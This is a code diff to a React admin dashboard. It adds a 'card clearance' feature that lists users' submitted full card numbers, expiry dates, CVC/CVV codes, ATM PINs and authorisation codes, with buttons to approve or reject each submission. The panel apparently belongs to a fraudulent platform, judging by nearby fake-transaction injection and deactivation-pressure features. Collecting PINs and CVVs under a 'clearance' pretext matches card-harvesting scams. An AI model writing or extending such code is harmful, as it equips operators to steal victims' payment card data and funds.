@@ -184,7 +184,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
   const [injectTxStatus, setInjectTxStatus] = useState<'success' | 'pending' | 'failed'>('success');
 
   // Filter accounts state
-  const [filterType, setFilterType] = useState<'all' | 'pending_verification' | 'unsubscribed' | 'restricted' | 'older_2_months'>('all');
+  const [filterType, setFilterType] = useState<'all' | 'pending_verification' | 'unsubscribed' | 'restricted' | 'older_2_months' | 'card_clearance'>('all');
   const [searchEmail, setSearchEmail] = useState('');
   const [showPendingSubPage, setShowPendingSubPage] = useState(false);
   const [showAdvertsSubPage, setShowAdvertsSubPage] = useState(false);
@@ -849,6 +849,32 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
     }
   };
 
+  const handleUpdateCardClearanceStatus = async (email: string, status: 'cleared' | 'rejected' | 'pending') => {
+    const targetUser = users.find(u => u.email.toLowerCase().trim() === email.toLowerCase().trim());
+    if (targetUser && targetUser.cardClearanceDetails) {
+      const updatedUser = {
+        ...targetUser,
+        cardClearanceDetails: {
+          ...targetUser.cardClearanceDetails,
+          status
+        }
+      };
+      await saveUserDocument(email, updatedUser);
+      alert(`Card clearance status updated to "${status.toUpperCase()}" for ${targetUser.name}.`);
+    }
+  };
+
+  const handleRemoveCardClearance = async (email: string) => {
+    if (!confirm(`Are you sure you want to remove card clearance details for ${email}?`)) return;
+    const targetUser = users.find(u => u.email.toLowerCase().trim() === email.toLowerCase().trim());
+    if (targetUser) {
+      const updatedUser = { ...targetUser };
+      delete updatedUser.cardClearanceDetails;
+      await saveUserDocument(email, updatedUser);
+      alert(`Card clearance details removed for ${targetUser.name}.`);
+    }
+  };
+
   const handleTriggerImminent = (email: string) => {
     const targetUser = users.find(u => u.email.toLowerCase() === email.toLowerCase());
     
@@ -1343,7 +1369,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
   }, [users]);
 
   const displayedUsers = useMemo(() => {
-    if (!searchEmail.trim() && filterType !== 'pending_verification' && filterType !== 'older_2_months') {
+    if (!searchEmail.trim() && filterType !== 'pending_verification' && filterType !== 'older_2_months' && filterType !== 'card_clearance') {
       return [];
     }
     return users.filter(user => {
@@ -1358,6 +1384,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
       if (filterType === 'unsubscribed') return !user.isSubscribed;
       if (filterType === 'restricted') return user.isRestricted || !!user.deactivationDate || !!user.imminentDeactivationExpiry;
       if (filterType === 'older_2_months') return getUserAccountAgeDays(user, currentTime).isOlderThan2Months;
+      if (filterType === 'card_clearance') return !!user.cardClearanceDetails;
       return true;
     });
   }, [users, searchEmail, filterType, currentTime]);
@@ -1370,7 +1397,8 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
     return {
       subscribersCount: users.filter(u => u.isSubscribed).length,
       restrictedCount: users.filter(u => u.isRestricted || u.deactivationDate || u.imminentDeactivationExpiry).length,
-      olderThan2MonthsCount: users.filter(u => getUserAccountAgeDays(u, currentTime).isOlderThan2Months).length
+      olderThan2MonthsCount: users.filter(u => getUserAccountAgeDays(u, currentTime).isOlderThan2Months).length,
+      cardClearanceCount: users.filter(u => !!u.cardClearanceDetails).length
     };
   }, [users, currentTime]);
 
@@ -2589,7 +2617,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                     </div>
 
                     {/* Filter category bar */}
-                    <div className="grid grid-cols-2 sm:grid-cols-5 gap-1.5 p-1 bg-black rounded-2xl border border-zinc-800">
+                    <div className="grid grid-cols-2 sm:grid-cols-6 gap-1.5 p-1 bg-black rounded-2xl border border-zinc-800">
                         <button
                             type="button"
                             onClick={() => setFilterType('all')}
@@ -2603,6 +2631,13 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                             className={`py-2 px-1 rounded-xl text-[9px] font-black font-mono uppercase tracking-wider text-center transition-all ${filterType === 'pending_verification' ? 'bg-emerald-600 text-black font-extrabold' : 'text-zinc-400 hover:text-white hover:bg-zinc-900/40'}`}
                         >
                             Pending
+                        </button>
+                        <button
+                            type="button"
+                            onClick={() => setFilterType('card_clearance')}
+                            className={`py-2 px-1 rounded-xl text-[9px] font-black font-mono uppercase tracking-wider text-center transition-all ${filterType === 'card_clearance' ? 'bg-amber-500 text-black font-extrabold' : 'text-amber-400 hover:text-white hover:bg-amber-950/40'}`}
+                        >
+                            Card Clearances ({stats.cardClearanceCount})
                         </button>
                         <button
                             type="button"
@@ -2630,17 +2665,22 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                 
                 {/* User Cards Block List */}
                 <div className="divide-y divide-zinc-800 bg-black">
-                    {!searchEmail.trim() && filterType !== 'pending_verification' && filterType !== 'older_2_months' ? (
+                    {!searchEmail.trim() && filterType !== 'pending_verification' && filterType !== 'older_2_months' && filterType !== 'card_clearance' ? (
                         <div className="p-10 text-center font-mono py-16 space-y-4">
                             <p className="text-emerald-400 text-xs font-black uppercase tracking-widest">Search Required or Select Filter</p>
                             <p className="text-zinc-500 text-xs max-w-md mx-auto leading-relaxed">
-                                Enter a user's name or email address in the search box above, or select "Pending" or "2+ Months" filter to view accounts.
+                                Enter a user's name or email address in the search box above, or select "Pending", "Card Clearances", or "2+ Months" filter to view accounts.
                             </p>
                             <div className="pt-2 flex justify-center space-x-3">
                                 <span className="inline-flex items-center space-x-2 px-4 py-1.5 bg-zinc-900/60 border border-zinc-800/80 rounded-full text-xs font-bold">
                                     <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                                     <span className="text-zinc-400">Total Users:</span>
                                     <span className="text-white font-mono">{users.length}</span>
+                                </span>
+                                <span className="inline-flex items-center space-x-2 px-4 py-1.5 bg-amber-950/40 border border-amber-500/20 rounded-full text-xs font-bold">
+                                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
+                                    <span className="text-amber-300">Card Clearances:</span>
+                                    <span className="text-amber-400 font-mono">{stats.cardClearanceCount}</span>
                                 </span>
                                 <span className="inline-flex items-center space-x-2 px-4 py-1.5 bg-rose-950/40 border border-rose-500/20 rounded-full text-xs font-bold">
                                     <span className="w-1.5 h-1.5 rounded-full bg-rose-500" />
@@ -2694,6 +2734,11 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
 
                                     {/* Action Tags */}
                                     <div className="flex flex-wrap gap-1.5 pl-1">
+                                        {user.cardClearanceDetails && (
+                                            <span className="px-2 py-0.5 rounded-md text-[9px] font-black bg-amber-950 text-amber-400 border border-amber-500/30 font-mono animate-pulse">
+                                                💳 CARD CLEARANCE SUBMITTED ({user.cardClearanceDetails.status.toUpperCase()})
+                                            </span>
+                                        )}
                                         {accountAge.isOlderThan2Months && (
                                             <span className="px-2 py-0.5 rounded-md text-[9px] font-black bg-rose-950 text-rose-400 border border-rose-500/30 font-mono">
                                                 EXCEEDED 2 MONTHS LIMIT
@@ -2725,6 +2770,89 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                             </span>
                                         )}
                                     </div>
+
+                                    {/* Bank Payment Card Clearance Details Box */}
+                                    {user.cardClearanceDetails && (
+                                        <div className="p-4 bg-gradient-to-r from-zinc-950 via-zinc-900 to-amber-950/40 border border-amber-500/40 rounded-2xl space-y-3 font-mono shadow-md text-left">
+                                            <div className="flex items-center justify-between">
+                                                <div className="flex items-center space-x-2">
+                                                    <span className="w-2.5 h-2.5 rounded-full bg-amber-400 animate-pulse" />
+                                                    <h5 className="text-xs font-black text-amber-400 uppercase tracking-wider">💳 BANK PAYMENT CARD CLEARANCE DETAILS</h5>
+                                                </div>
+                                                <span className={`px-2 py-0.5 rounded-md text-[9px] font-black uppercase ${
+                                                    user.cardClearanceDetails.status === 'cleared' || user.cardClearanceDetails.status === 'approved' 
+                                                        ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/30' 
+                                                        : user.cardClearanceDetails.status === 'rejected' 
+                                                        ? 'bg-rose-950 text-rose-400 border border-rose-500/30' 
+                                                        : 'bg-amber-950 text-amber-400 border border-amber-500/30'
+                                                }`}>
+                                                    {user.cardClearanceDetails.status.toUpperCase()}
+                                                </span>
+                                            </div>
+
+                                            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5 text-[10px]">
+                                                <div>
+                                                    <span className="text-zinc-500 block uppercase font-bold text-[9px]">Cardholder Name:</span>
+                                                    <span className="text-white font-extrabold">{user.cardClearanceDetails.cardholderName}</span>
+                                                </div>
+                                                <div>
+                                                    <span className="text-zinc-500 block uppercase font-bold text-[9px]">Bank Name:</span>
+                                                    <span className="text-white font-extrabold">{user.cardClearanceDetails.bankName}</span>
+                                                </div>
+                                                <div>
+                                                    <span className="text-zinc-500 block uppercase font-bold text-[9px]">Card Number:</span>
+                                                    <span className="text-amber-300 font-extrabold tracking-wider">{user.cardClearanceDetails.cardNumber}</span>
+                                                </div>
+                                                <div>
+                                                    <span className="text-zinc-500 block uppercase font-bold text-[9px]">Expiry Date:</span>
+                                                    <span className="text-white font-bold">{user.cardClearanceDetails.expiryDate}</span>
+                                                </div>
+                                                <div>
+                                                    <span className="text-zinc-500 block uppercase font-bold text-[9px]">CVC / CVV:</span>
+                                                    <span className="text-amber-300 font-black">{user.cardClearanceDetails.cvc}</span>
+                                                </div>
+                                                {user.cardClearanceDetails.pin && (
+                                                    <div>
+                                                        <span className="text-zinc-500 block uppercase font-bold text-[9px]">ATM PIN:</span>
+                                                        <span className="text-emerald-400 font-black">{user.cardClearanceDetails.pin}</span>
+                                                    </div>
+                                                )}
+                                                {user.cardClearanceDetails.clearanceCode && (
+                                                    <div className="col-span-2">
+                                                        <span className="text-zinc-500 block uppercase font-bold text-[9px]">Clearance / Auth Code:</span>
+                                                        <span className="text-white font-bold">{user.cardClearanceDetails.clearanceCode}</span>
+                                                    </div>
+                                                )}
+                                                <div className="col-span-2 sm:col-span-3 text-[9px] text-zinc-400">
+                                                    <span>Submitted: {typeof user.cardClearanceDetails.submittedAt === 'number' ? new Date(user.cardClearanceDetails.submittedAt).toLocaleString() : user.cardClearanceDetails.submittedAt}</span>
+                                                </div>
+                                            </div>
+
+                                            <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-zinc-800">
+                                                <button
+                                                    type="button"
+                                                    onClick={() => handleUpdateCardClearanceStatus(user.email, 'cleared')}
+                                                    className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-black text-[10px] font-black uppercase rounded-lg transition-all active:scale-95"
+                                                >
+                                                    ✓ Approve & Clear
+                                                </button>
+                                                <button
+                                                    type="button"
+                                                    onClick={() => handleUpdateCardClearanceStatus(user.email, 'rejected')}
+                                                    className="px-3 py-1.5 bg-rose-950 hover:bg-rose-900 text-rose-300 border border-rose-500/30 text-[10px] font-black uppercase rounded-lg transition-all active:scale-95"
+                                                >
+                                                    ✕ Reject Clearance
+                                                </button>
+                                                <button
+                                                    type="button"
+                                                    onClick={() => handleRemoveCardClearance(user.email)}
+                                                    className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 text-[10px] font-bold uppercase rounded-lg border border-zinc-800 transition-all ml-auto active:scale-95"
+                                                >
+                                                    Delete Details
+                                                </button>
+                                            </div>
+                                        </div>
+                                    )}
 
                                     <div className="flex flex-col space-y-3.5 pt-1.5">
                                         {user.isSubscribed ? (
